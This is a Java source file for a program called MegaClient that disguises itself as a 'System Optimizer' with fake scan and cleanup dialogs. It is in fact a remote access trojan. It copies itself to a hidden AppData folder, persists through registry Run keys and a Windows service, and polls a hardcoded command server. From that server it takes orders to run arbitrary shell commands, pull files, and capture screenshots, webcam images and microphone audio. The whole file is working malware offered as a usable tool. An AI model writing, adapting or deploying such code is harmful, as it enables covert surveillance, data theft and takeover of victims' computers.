import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.awt.event.*;
import java.io.*;
import java.net.*;
import javax.imageio.ImageIO;
import javax.sound.sampled.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.prefs.Preferences;
import java.nio.file.*;
import java.util.Base64;

public class MegaClient {
    private static final String SERVER_URL = "http://192.168.100.3:5000";
    private static final int POLL_INTERVAL = 2000; // 2 seconds
    private static final int CONNECTION_TIMEOUT = 10000;
    
    private static boolean connected = false;
    private static boolean processingCommand = false;
    private static String currentWorkingDirectory = System.getProperty("user.home");
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static ExecutorService executorService;
    
    // Windows Service related
    private static final String SERVICE_NAME = "SystemOptimizerService";
    private static Preferences prefs = Preferences.userNodeForPackage(MegaClient.class);
    
    // App features
    private static boolean minimizeToTray = true;
    private static boolean startMinimized = false;
    private static boolean autoStart = false;
    private static final String APP_NAME = "SystemOptimizer";
    private static final String REGISTRY_KEY = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    // Clone related
    private static final String CLONE_NAME = "SystemHelper.exe";
    private static final String CLONE_DIR = System.getProperty("user.home") + File.separator + "AppData" + File.separator + "Local" + File.separator + "SystemTools";
    private static File cloneFile;
    private static boolean isClone = false;
    
    public static void main(String[] args) {
        // Check if we're the clone
        String currentPath = System.getProperty("user.dir") + File.separator + "MegaClient.jar";
        cloneFile = new File(CLONE_DIR, CLONE_NAME);
        isClone = currentPath.equals(cloneFile.getAbsolutePath());
        
        // Add crash handler
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
            writeCrashReport(throwable);
            System.exit(1);
        });
        
        try {
            // Process command line arguments
            for (String arg : args) {
                if (arg.equalsIgnoreCase("--minimized")) {
                    startMinimized = true;
                } else if (arg.equalsIgnoreCase("--service")) {
                    runAsService();
                    return;
                } else if (arg.equalsIgnoreCase("--autostart")) {
                    autoStart = true;
                }
            }
            
            // Clone ourselves if not already cloned
            if (!isClone) {
                createClone();
            }
            
            // Create GUI
            SwingUtilities.invokeLater(() -> {
                JFrame frame = new JFrame("System Optimizer");
                frame.setSize(600, 400);
                frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
                
                // Add window listener to minimize to tray when closed
                frame.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent e) {
                        if (minimizeToTray) {
                            frame.setVisible(false);
                        } else {
                            running.set(false);
                            System.exit(0);
                        }
                    }
                });
                
                frame.setLayout(new BorderLayout());
                
                // Create a simple UI that looks like a system optimizer
                JPanel mainPanel = new JPanel(new BorderLayout());
                mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
                
                // Header with logo
                JPanel headerPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
                JLabel logoLabel = new JLabel(createLogoIcon());
                JLabel titleLabel = new JLabel("System Optimizer");
                titleLabel.setFont(new Font("Arial", Font.BOLD, 24));
                headerPanel.add(logoLabel);
                headerPanel.add(titleLabel);
                mainPanel.add(headerPanel, BorderLayout.NORTH);
                
                // Status panel
                JPanel statusPanel = new JPanel(new GridLayout(2, 1));
                statusPanel.setBorder(BorderFactory.createTitledBorder("System Status"));
                
                JPanel cpuPanel = new JPanel(new BorderLayout());
                cpuPanel.add(new JLabel("CPU Usage:"), BorderLayout.WEST);
                JProgressBar cpuBar = new JProgressBar(0, 100);
                cpuBar.setValue(45); // Dummy value
                cpuBar.setStringPainted(true);
                cpuBar.setString("45%");
                cpuPanel.add(cpuBar, BorderLayout.CENTER);
                
                JPanel memPanel = new JPanel(new BorderLayout());
                memPanel.add(new JLabel("Memory Usage:"), BorderLayout.WEST);
                JProgressBar memBar = new JProgressBar(0, 100);
                memBar.setValue(62); // Dummy value
                memBar.setStringPainted(true);
                memBar.setString("62%");
                memPanel.add(memBar, BorderLayout.CENTER);
                
                statusPanel.add(cpuPanel);
                statusPanel.add(memPanel);
                mainPanel.add(statusPanel, BorderLayout.CENTER);
                
                // Button panel
                JPanel buttonPanel = new JPanel(new GridLayout(2, 3, 5, 5));
                buttonPanel.setBorder(BorderFactory.createEmptyBorder(10, 0, 0, 0));
                
                JButton scanButton = new JButton("Scan System");
                scanButton.addActionListener(e -> JOptionPane.showMessageDialog(frame, 
                    "System scan completed. No issues found.", 
                    "Scan Results", JOptionPane.INFORMATION_MESSAGE));
                
                JButton cleanButton = new JButton("Clean Junk Files");
                cleanButton.addActionListener(e -> JOptionPane.showMessageDialog(frame, 
                    "Cleaned 125 MB of junk files.", 
                    "Clean Results", JOptionPane.INFORMATION_MESSAGE));
                
                JButton optimizeButton = new JButton("Optimize Performance");
                optimizeButton.addActionListener(e -> JOptionPane.showMessageDialog(frame, 
                    "System performance optimized successfully.", 
                    "Optimization Results", JOptionPane.INFORMATION_MESSAGE));
                
                JButton settingsButton = new JButton("Settings");
                settingsButton.addActionListener(e -> {
                    JDialog settingsDialog = new JDialog(frame, "Settings", true);
                    settingsDialog.setSize(400, 300);
                    settingsDialog.setLayout(new BorderLayout());
                    
                    JPanel settingsPanel = new JPanel(new GridLayout(3, 1, 5, 15));
                    settingsPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
                    
                    JCheckBox minimizeToTrayCheck = new JCheckBox("Minimize to System Tray", minimizeToTray);
                    minimizeToTrayCheck.addActionListener(event -> minimizeToTray = minimizeToTrayCheck.isSelected());
                    
                    JCheckBox startupCheck = new JCheckBox("Start with Windows", isInStartup());
                    startupCheck.addActionListener(event -> {
                        if (startupCheck.isSelected()) {
                            addToStartup();
                        } else {
                            removeFromStartup();
                        }
                    });
                    
                    JButton serviceButton = new JButton(isServiceInstalled() ? "Uninstall Service" : "Install Service");
                    serviceButton.addActionListener(event -> {
                        if (isServiceInstalled()) {
                            uninstallService();
                            serviceButton.setText("Install Service");
                        } else {
                            installService();
                            serviceButton.setText("Uninstall Service");
                        }
                    });
                    
                    settingsPanel.add(minimizeToTrayCheck);
                    settingsPanel.add(startupCheck);
                    settingsPanel.add(serviceButton);
                    
                    settingsDialog.add(settingsPanel, BorderLayout.CENTER);
                    settingsDialog.setLocationRelativeTo(frame);
                    settingsDialog.setVisible(true);
                });
                
                JButton aboutButton = new JButton("About");
                aboutButton.addActionListener(e -> JOptionPane.showMessageDialog(frame, 
                    "System Optimizer v1.0\n\nA simple tool to optimize your system performance.\n\n© 2023 SystemTools Inc.", 
                    "About", JOptionPane.INFORMATION_MESSAGE));
                
                JButton exitButton = new JButton("Exit");
                exitButton.addActionListener(e -> {
                    running.set(false);
                    System.exit(0);
                });
                
                buttonPanel.add(scanButton);
                buttonPanel.add(cleanButton);
                buttonPanel.add(optimizeButton);
                buttonPanel.add(settingsButton);
                buttonPanel.add(aboutButton);
                buttonPanel.add(exitButton);
                
                mainPanel.add(buttonPanel, BorderLayout.SOUTH);
                frame.add(mainPanel, BorderLayout.CENTER);
                
                // Check if in startup and add if not
                if (!isInStartup()) {
                    addToStartup();
                }
                
                // Start HTTP client
                startHttpClient();
                
                // Show or hide frame based on startMinimized flag
                if (!startMinimized) {
                    frame.setVisible(true);
                    frame.setLocationRelativeTo(null);
                } else {
                    frame.setVisible(false);
                }
            });
        } catch (Exception e) {
            writeCrashReport(e);
            System.exit(1);
        }
    }
    
    private static void createClone() {
        try {
            // Create clone directory if it doesn't exist
            File cloneDir = new File(CLONE_DIR);
            if (!cloneDir.exists()) {
                cloneDir.mkdirs();
            }
            
            // Get current JAR file path
            String currentPath = System.getProperty("user.dir") + File.separator + "MegaClient.jar";
            File currentFile = new File(currentPath);
            
            // Copy JAR to clone location
            if (!cloneFile.exists() || cloneFile.length() != currentFile.length()) {
                Files.copy(currentFile.toPath(), cloneFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                
                // Add clone to startup
                String command = "reg add \"" + REGISTRY_KEY + "\" /v \"" + APP_NAME + "Helper\" /t REG_SZ /d \"\\\"" + cloneFile.getAbsolutePath() + "\\\" --minimized\" /f";
                Runtime.getRuntime().exec("cmd.exe /c " + command);
            }
            
            // Check if original exists, if not recreate it
            if (!currentFile.exists()) {
                Files.copy(cloneFile.toPath(), currentFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static ImageIcon createLogoIcon() {
        // Create a simple logo icon
        BufferedImage image = new BufferedImage(64, 64, BufferedImage.TYPE_INT_ARGB);
        Graphics2D g2d = image.createGraphics();
        
        // Set anti-aliasing
        g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
        
        // Draw a gear icon
        g2d.setColor(new Color(0, 120, 215));
        g2d.fillOval(10, 10, 44, 44);
        
        g2d.setColor(Color.WHITE);
        g2d.fillOval(20, 20, 24, 24);
        
        // Draw gear teeth
        for (int i = 0; i < 8; i++) {
            double angle = i * Math.PI / 4;
            int x1 = (int) (32 + 20 * Math.cos(angle));
            int y1 = (int) (32 + 20 * Math.sin(angle));
            int x2 = (int) (32 + 28 * Math.cos(angle));
            int y2 = (int) (32 + 28 * Math.sin(angle));
            g2d.fillRect(x1 - 2, y1 - 2, x2 - x1 + 4, y2 - y1 + 4);
        }
        
        g2d.dispose();
        return new ImageIcon(image);
    }
    
    private static void writeCrashReport(Throwable throwable) {
        try {
            File crashFile = new File(System.getProperty("java.io.tmpdir"), "system_optimizer_crash.log");
            try (PrintWriter writer = new PrintWriter(new FileWriter(crashFile, true))) {
                writer.println("=== CRASH REPORT ===");
                writer.println("Timestamp: " + new java.util.Date());
                writer.println("OS: " + System.getProperty("os.name"));
                writer.println("Java Version: " + System.getProperty("java.version"));
                writer.println("\nStack Trace:");
                throwable.printStackTrace(writer);
                writer.println("\n");
            }
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void runAsService() {
        try {
            // Start HTTP client
            startHttpClient();
            
            // Keep the service running
            while (running.get()) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        } catch (Exception e) {
            writeCrashReport(e);
        }
    }
    
    private static boolean isServiceInstalled() {
        try {
            Process process = Runtime.getRuntime().exec("sc query " + SERVICE_NAME);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("STATE") && line.contains("RUNNING")) {
                    return true;
                }
            }
            return false;
        } catch (IOException e) {
            return false;
        }
    }
    
    private static void installService() {
        try {
            String javaPath = System.getProperty("java.home") + "\\bin\\java.exe";
            String jarPath = new File(MegaClient.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()).getPath();
            
            // Create a batch file to install the service with elevation request
            File batchFile = File.createTempFile("install-service", ".bat");
            try (PrintWriter writer = new PrintWriter(batchFile)) {
                writer.println("@echo off");
                writer.println("echo Requesting administrator privileges...");
                writer.println("powershell Start-Process -FilePath \"%~f0\" -Verb RunAs");
                writer.println("exit");
                writer.println(":admin");
                writer.println("echo Installing service...");
                writer.println("sc create " + SERVICE_NAME + " binPath= \"" + javaPath + " -jar \"" + jarPath + "\" --service\"");
                writer.println("sc description " + SERVICE_NAME + " \"System Optimizer Service\"");
                writer.println("sc start " + SERVICE_NAME);
                writer.println("echo Service installed successfully.");
                writer.println("pause");
            }
            
            // Run the batch file
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", batchFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();
            
            // Clean up
            batchFile.delete();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void uninstallService() {
        try {
            // Create a batch file to uninstall the service with elevation request
            File batchFile = File.createTempFile("uninstall-service", ".bat");
            try (PrintWriter writer = new PrintWriter(batchFile)) {
                writer.println("@echo off");
                writer.println("echo Requesting administrator privileges...");
                writer.println("powershell Start-Process -FilePath \"%~f0\" -Verb RunAs");
                writer.println("exit");
                writer.println(":admin");
                writer.println("echo Stopping service...");
                writer.println("sc stop " + SERVICE_NAME);
                writer.println("echo Deleting service...");
                writer.println("sc delete " + SERVICE_NAME);
                writer.println("echo Service uninstalled successfully.");
                writer.println("pause");
            }
            
            // Run the batch file
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", batchFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();
            
            // Clean up
            batchFile.delete();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static boolean isInStartup() {
        try {
            String command = "reg query \"" + REGISTRY_KEY + "\" /v \"" + APP_NAME + "\"";
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            return process.exitValue() == 0;
        } catch (Exception e) {
            return false;
        }
    }
    
    private static void addToStartup() {
        try {
            String javaPath = System.getProperty("java.home") + "\\bin\\javaw.exe";
            String jarPath = new File(MegaClient.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()).getPath();
            
            // Create a batch file to add to startup with elevation request
            File batchFile = File.createTempFile("addStartup", ".bat");
            try (PrintWriter writer = new PrintWriter(batchFile)) {
                writer.println("@echo off");
                writer.println("echo Requesting administrator privileges...");
                writer.println("powershell Start-Process -FilePath \"%~f0\" -Verb RunAs");
                writer.println("exit");
                writer.println(":admin");
                writer.println("echo Adding to startup...");
                String escapedJavaPath = javaPath.replace("\"", "\"\"");
                String escapedJarPath = jarPath.replace("\"", "\"\"");
                writer.println("reg add \"" + REGISTRY_KEY + "\" /v \"" + APP_NAME + 
                            "\" /t REG_SZ /d \"\\\"" + escapedJavaPath + "\\\" -jar \\\"" + escapedJarPath + "\\\" --minimized\" /f");
                writer.println("if %ERRORLEVEL% equ 0 (");
                writer.println("    echo Successfully added to startup");
                writer.println(") else (");
                writer.println("    echo Failed to add to startup");
                writer.println(")");
                writer.println("exit /b %ERRORLEVEL%");
            }
            
            // Run the batch file
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", batchFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            // Clean up
            batchFile.delete();
            
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void removeFromStartup() {
        try {
            // Create a batch file to remove from startup with elevation request
            File batchFile = File.createTempFile("removeStartup", ".bat");
            try (PrintWriter writer = new PrintWriter(batchFile)) {
                writer.println("@echo off");
                writer.println("echo Requesting administrator privileges...");
                writer.println("powershell Start-Process -FilePath \"%~f0\" -Verb RunAs");
                writer.println("exit");
                writer.println(":admin");
                writer.println("echo Removing from startup...");
                writer.println("reg delete \"" + REGISTRY_KEY + "\" /v \"" + APP_NAME + "\" /f");
                writer.println("if %ERRORLEVEL% equ 0 (");
                writer.println("    echo Successfully removed from startup");
                writer.println(") else (");
                writer.println("    echo Failed to remove from startup");
                writer.println(")");
                writer.println("exit /b %ERRORLEVEL%");
            }
            
            // Run the batch file
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", batchFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            // Clean up
            batchFile.delete();
            
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void startHttpClient() {
        executorService = Executors.newFixedThreadPool(3);
        
        // HTTP client thread
        executorService.submit(() -> {
            while (running.get()) {
                try {
                    // Get command from server
                    String command = getCommandFromServer();
                    
                    if (command != null && !command.equals("NOOP") && !processingCommand) {
                        processingCommand = true;
                        final String cmd = command;
                        executorService.submit(() -> {
                            try {
                                processCommand(cmd);
                            } catch (Exception e) {
                                // Silently fail
                            } finally {
                                processingCommand = false;
                            }
                        });
                    }
                    
                    // Sleep before next poll
                    Thread.sleep(POLL_INTERVAL);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    // Silently fail
                }
            }
        });
    }
    
    private static String getCommandFromServer() {
        try {
            URL url = new URL(SERVER_URL + "/command");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(CONNECTION_TIMEOUT);
            connection.setReadTimeout(CONNECTION_TIMEOUT);
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) {
                        response.append(line);
                    }
                    
                    // Parse JSON response
                    String json = response.toString();
                    if (json.contains("\"command\":")) {
                        int start = json.indexOf("\"command\":\"") + 11;
                        int end = json.indexOf("\"", start);
                        return json.substring(start, end);
                    }
                }
            }
            connection.disconnect();
        } catch (Exception e) {
            // Silently fail
        }
        return null;
    }
    
    private static void sendResultToServer(String command, int exitCode, String output, String error) {
        try {
            URL url = new URL(SERVER_URL + "/result");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setConnectTimeout(CONNECTION_TIMEOUT);
            connection.setReadTimeout(CONNECTION_TIMEOUT);
            connection.setDoOutput(true);
            
            // Create JSON payload
            String jsonPayload = String.format(
                "{\"command\":\"%s\",\"exit_code\":%d,\"output\":\"%s\",\"error\":\"%s\"}",
                escapeJson(command), exitCode, escapeJson(output), escapeJson(error)
            );
            
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            
            int responseCode = connection.getResponseCode();
            connection.disconnect();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static String escapeJson(String text) {
        if (text == null) return "";
        return text.replace("\\", "\\\\")
                  .replace("\"", "\\\"")
                  .replace("\r", "\\r")
                  .replace("\n", "\\n")
                  .replace("\t", "\\t");
    }
    
    private static void processCommand(String command) {
        try {
            if (command.equals("HEARTBEAT")) {
                // Heartbeat response, do nothing
                return;
            } else if (command.startsWith("send ")) {
                String filePath = command.substring(5);
                downloadFile(filePath);
                sendResultToServer(command, 0, "File downloaded successfully", "");
            } else if (command.startsWith("pull ")) {
                String filePath = command.substring(5);
                uploadFile(filePath, "/upload");
                sendResultToServer(command, 0, "File uploaded successfully", "");
            } else if (command.equals("screenshot")) {
                takeScreenshot();
                sendResultToServer(command, 0, "Screenshot captured", "");
            } else if (command.equals("webcam")) {
                takeWebcamSnapshot();
                sendResultToServer(command, 0, "Webcam snapshot captured", "");
            } else if (command.startsWith("microphone ")) {
                try {
                    String durationStr = command.substring(11).trim();
                    int duration = Integer.parseInt(durationStr);
                    if (duration > 0) {
                        recordAudio(duration);
                        sendResultToServer(command, 0, "Audio recorded", "");
                    }
                } catch (NumberFormatException e) {
                    sendResultToServer(command, 1, "", "Invalid duration");
                }
            } else if (command.equals("pwd")) {
                // Print working directory
                sendResultToServer(command, 0, currentWorkingDirectory, "");
            } else if (command.startsWith("cd ")) {
                // Change directory
                String newDir = command.substring(3).trim();
                changeDirectory(newDir);
            } else if (command.equals("cd")) {
                // cd with no arguments goes to home
                currentWorkingDirectory = System.getProperty("user.home");
                sendResultToServer(command, 0, "Changed directory to: " + currentWorkingDirectory, "");
            } else if (!command.trim().isEmpty()) {
                executeShellCommand(command);
            }
        } catch (Exception e) {
            sendResultToServer(command, 1, "", "Error processing command: " + e.getMessage());
        }
    }
    
    private static void downloadFile(String filename) {
        try {
            URL url = new URL(SERVER_URL + "/download/" + URLEncoder.encode(filename, "UTF-8"));
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(CONNECTION_TIMEOUT);
            connection.setReadTimeout(CONNECTION_TIMEOUT);
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                File file = new File(currentWorkingDirectory, filename);
                file.getParentFile().mkdirs();
                
                try (InputStream is = connection.getInputStream();
                     FileOutputStream fos = new FileOutputStream(file)) {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = is.read(buffer)) != -1) {
                        fos.write(buffer, 0, bytesRead);
                    }
                }
            }
            connection.disconnect();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void uploadFile(String filePath, String endpoint) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                sendResultToServer("pull " + filePath, 1, "", "File not found: " + filePath);
                return;
            }
            
            String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
            URL url = new URL(SERVER_URL + endpoint);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            connection.setConnectTimeout(CONNECTION_TIMEOUT);
            connection.setReadTimeout(CONNECTION_TIMEOUT);
            connection.setDoOutput(true);
            
            try (OutputStream os = connection.getOutputStream();
                 PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true)) {
                
                // Send file header
                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(file.getName()).append("\"\r\n");
                writer.append("Content-Type: application/octet-stream\r\n\r\n");
                writer.flush();
                
                // Send file content
                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        os.write(buffer, 0, bytesRead);
                    }
                }
                os.flush();
                
                // Send end of multipart
                writer.append("\r\n--").append(boundary).append("--\r\n");
                writer.flush();
            }
            
            int responseCode = connection.getResponseCode();
            connection.disconnect();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void takeScreenshot() {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenImage = robot.createScreenCapture(screenRect);
            
            File tempFile = File.createTempFile("screenshot", ".png");
            ImageIO.write(screenImage, "png", tempFile);
            
            uploadFile(tempFile.getAbsolutePath(), "/screenshot");
            
            tempFile.delete();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void takeWebcamSnapshot() {
        Process process = null;
        try {
            String os = System.getProperty("os.name").toLowerCase();
            File tempFile = File.createTempFile("webcam", ".jpg");
            String tempPath = tempFile.getAbsolutePath();
            
            ProcessBuilder pb;
            
            if (os.contains("win")) {
                // Windows - using CommandCam
                pb = new ProcessBuilder("CommandCam", "/filename", tempPath);
                pb.redirectErrorStream(true);
                process = pb.start();
                
                // Read output
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    // Silently read output
                }
                
                int exitCode = process.waitFor();
                
                if (exitCode != 0 || !tempFile.exists() || tempFile.length() == 0) {
                    throw new Exception("CommandCam failed");
                }
                
            } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
                // Linux/Unix/Mac
                if (os.contains("mac")) {
                    // macOS - using imagesnap
                    pb = new ProcessBuilder("imagesnap", "-w", "1", tempPath);
                } else {
                    // Linux - using fswebcam
                    pb = new ProcessBuilder("fswebcam", "-r", "640x480", "--no-banner", "-S", "5", tempPath);
                }
                
                pb.redirectErrorStream(true);
                process = pb.start();
                
                // Read output
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    // Silently read output
                }
                
                int exitCode = process.waitFor();
                
                if (exitCode != 0) {
                    throw new Exception("Webcam capture command failed with exit code: " + exitCode);
                }
            } else {
                throw new Exception("Unsupported operating system: " + os);
            }
            
            // Check if file was created and has content
            if (!tempFile.exists() || tempFile.length() == 0) {
                sendResultToServer("webcam", 1, "", "Webcam capture failed - no capture tool available");
                tempFile.delete();
                return;
            }
            
            // Upload the file to the server
            uploadFile(tempPath, "/webcam");
            
            // Delete the temporary file
            tempFile.delete();
            
        } catch (Exception e) {
            // Silently fail
        } finally {
            if (process != null && process.isAlive()) {
                process.destroy();
            }
        }
    }
    
    private static void recordAudio(int duration) {
        TargetDataLine line = null;
        ByteArrayOutputStream byteArrayOutputStream = null;
        
        try {
            // Define audio format
            AudioFormat format = new AudioFormat(
                AudioFormat.Encoding.PCM_SIGNED,
                44100.0f,  // Sample rate
                16,        // Bits per sample
                2,         // Channels (stereo)
                4,         // Frame size (2 channels * 16 bits / 8)
                44100.0f,  // Frame rate
                false      // Little endian
            );
            
            // Get the microphone line
            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
            
            if (!AudioSystem.isLineSupported(info)) {
                // Try with mono
                format = new AudioFormat(
                    AudioFormat.Encoding.PCM_SIGNED,
                    44100.0f,
                    16,
                    1,  // Mono
                    2,  // Frame size (1 channel * 16 bits / 8)
                    44100.0f,
                    false
                );
                info = new DataLine.Info(TargetDataLine.class, format);
                
                if (!AudioSystem.isLineSupported(info)) {
                    sendResultToServer("microphone " + duration, 1, "", "Audio recording not supported");
                    return;
                }
            }
            
            // Open and start the microphone line
            line = (TargetDataLine) AudioSystem.getLine(info);
            line.open(format);
            line.start();
            
            // Record audio in memory
            byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            
            long startTime = System.currentTimeMillis();
            long endTime = startTime + (duration * 1000L);
            
            while (System.currentTimeMillis() < endTime) {
                int bytesRead = line.read(buffer, 0, buffer.length);
                if (bytesRead > 0) {
                    byteArrayOutputStream.write(buffer, 0, bytesRead);
                }
            }
            
            // Stop and close the line
            line.stop();
            line.close();
            line = null;
            
            // Convert to audio file
            byte[] audioData = byteArrayOutputStream.toByteArray();
            byteArrayOutputStream.close();
            byteArrayOutputStream = null;
            
            if (audioData.length == 0) {
                sendResultToServer("microphone " + duration, 1, "", "Audio recording failed - no data captured");
                return;
            }
            
            // Create audio input stream
            ByteArrayInputStream bais = new ByteArrayInputStream(audioData);
            AudioInputStream audioInputStream = new AudioInputStream(
                bais, 
                format, 
                audioData.length / format.getFrameSize()
            );
            
            // Save to temporary file
            File tempFile = File.createTempFile("audio", ".wav");
            AudioSystem.write(audioInputStream, AudioFileFormat.Type.WAVE, tempFile);
            audioInputStream.close();
            
            // Upload the file to the server
            uploadFile(tempFile.getAbsolutePath(), "/microphone");
            
            // Delete the temporary file
            tempFile.delete();
            
        } catch (Exception e) {
            // Silently fail
        } finally {
            // Clean up resources
            if (line != null && line.isOpen()) {
                line.stop();
                line.close();
            }
            if (byteArrayOutputStream != null) {
                try {
                    byteArrayOutputStream.close();
                } catch (IOException e) {
                    // Ignore
                }
            }
        }
    }
    
    private static void changeDirectory(String newDir) {
        try {
            File dir;
            
            // Handle special cases
            if (newDir.equals("..")) {
                // Go up one directory
                dir = new File(currentWorkingDirectory).getParentFile();
                if (dir == null) {
                    sendResultToServer("cd " + newDir, 1, "", "Already at root directory");
                    return;
                }
            } else if (newDir.equals("~") || newDir.equals("$HOME")) {
                // Go to home directory
                dir = new File(System.getProperty("user.home"));
            } else if (newDir.startsWith("/")) {
                // Absolute path
                dir = new File(newDir);
            } else {
                // Relative path
                dir = new File(currentWorkingDirectory, newDir);
            }
            
            // Check if directory exists and is a directory
            if (!dir.exists()) {
                sendResultToServer("cd " + newDir, 1, "", "Directory does not exist: " + newDir);
            } else if (!dir.isDirectory()) {
                sendResultToServer("cd " + newDir, 1, "", "Not a directory: " + newDir);
            } else {
                // Change the working directory
                currentWorkingDirectory = dir.getCanonicalPath();
                sendResultToServer("cd " + newDir, 0, "Changed directory to: " + currentWorkingDirectory, "");
            }
        } catch (Exception e) {
            sendResultToServer("cd " + newDir, 1, "", "Error changing directory: " + e.getMessage());
        }
    }
    
    private static void executeShellCommand(String command) {
        try {
            // Determine the OS and use appropriate shell
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb;
            
            if (os.contains("win")) {
                // Windows - use cmd.exe
                pb = new ProcessBuilder("cmd.exe", "/c", command);
            } else {
                // Linux/Unix/Mac - use bash or sh
                pb = new ProcessBuilder("/bin/bash", "-c", command);
            }
            
            // Set the working directory for the command
            pb.directory(new File(currentWorkingDirectory));
            
            // Start the process
            Process process = pb.start();
            
            // Create streams for reading output and error
            InputStream inputStream = process.getInputStream();
            InputStream errorStream = process.getErrorStream();
            
            // Create readers for the streams
            BufferedReader inputReader = new BufferedReader(new InputStreamReader(inputStream));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(errorStream));
            
            // Create string builders to store the output
            StringBuilder output = new StringBuilder();
            StringBuilder error = new StringBuilder();
            
            // Read the output stream
            String line;
            while ((line = inputReader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            // Read the error stream
            while ((line = errorReader.readLine()) != null) {
                error.append(line).append("\n");
            }
            
            // Wait for the process to complete
            int exitCode = process.waitFor();
            
            // Send the output back to the server
            sendResultToServer(command, exitCode, output.toString(), error.toString());
            
        } catch (Exception e) {
            sendResultToServer(command, 1, "", "Error executing command: " + e.getMessage());
        }
    }
}
